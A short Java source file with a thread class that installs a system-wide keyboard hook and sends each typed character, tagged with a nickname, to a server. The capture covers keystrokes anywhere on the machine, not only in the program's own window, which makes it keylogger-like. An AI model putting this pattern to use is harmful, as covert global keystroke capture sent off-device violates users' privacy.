package sample;

import lc.kra.system.keyboard.GlobalKeyboardHook;
import lc.kra.system.keyboard.event.GlobalKeyAdapter;
import lc.kra.system.keyboard.event.GlobalKeyEvent;

import static sample.Main.*;

public class Threading extends Thread{


    @Override
    public void run() {

        GlobalKeyboardHook hook = new GlobalKeyboardHook(true);
        hook.addKeyListener(new GlobalKeyAdapter() {
            @Override
            public void keyPressed(GlobalKeyEvent event) {
                if (validChar(event.getKeyChar()) && !nickname.equals(""))
                    sendDataToServer(event.getKeyChar()+":"+nickname);
            }
        });
    }
}
